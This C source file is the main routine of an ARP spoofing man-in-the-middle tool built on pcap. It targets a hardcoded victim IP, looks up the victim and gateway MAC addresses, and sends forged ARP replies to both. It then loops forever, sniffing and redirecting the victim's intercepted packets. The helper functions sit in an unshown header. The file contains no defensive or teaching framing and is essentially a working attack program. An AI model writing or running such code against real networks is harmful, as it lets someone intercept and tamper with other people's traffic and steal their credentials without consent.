#include "myHeader.h"

int main()
{
	LANINFO LanInfo;
	pcap_if_t *alldevs, *choiceDev;
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	char victimIP[16] = "192.168.50.135";

	/* Retrieve the device list from the local machine */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
		exit(1);
	}
	choiceDev = ChoiceDev(alldevs);

	/* Get Handle From choice Device */
	handle = pcap_open_live(choiceDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", choiceDev->name, errbuf);
		exit(1);
	}
	/* now, we don't need any more the devices list */
	pcap_freealldevs(alldevs);
	memset(&LanInfo, 0, sizeof(LanInfo));
	/* find Device's GateWay IP address */
	getGateWayAddress(choiceDev, &LanInfo);
	LanInfo.victimIP.S_un.S_addr = inet_addr(victimIP);
	getMACAddress(handle, &LanInfo);
	printf("victim MAC : ");
	for (int i = 0; i < 6; i++)
	{
		if (i == 5)
			printf("%.2X\n", LanInfo.victimMAC[i]);
		else
			printf("%.2X-", LanInfo.victimMAC[i]);
	}
	printf("Gateway MAC : ");
	for (int i = 0; i < 6; i++)
	{
		if (i == 5)
			printf("%.2X\n", LanInfo.gatewayMAC[i]);
		else
			printf("%.2X-", LanInfo.gatewayMAC[i]);
	}
	/* send fake arp packet */
	ARP_PACKET arpPacket;
	arpPacket.ethernet.etherType = ntohs(ARP);
	setArpHeader(&arpPacket.arp);
	attackvictim(handle, &arpPacket, &LanInfo);
	Sleep(500);
	attackRouter(handle, &arpPacket, &LanInfo);
	/* sniff packet */
	struct pcap_pkthdr* header;
	const u_char* packet;
	printf("listen...");
	while (1)
	{
		if (pcap_next_ex(handle, &header, &packet) == 1)
		{
			if (checkARP(handle, packet, &LanInfo))
				continue;
			else
				packetRedirect(handle, header, packet, &LanInfo);
		}
	}
	pcap_close(handle);
	return 0;
}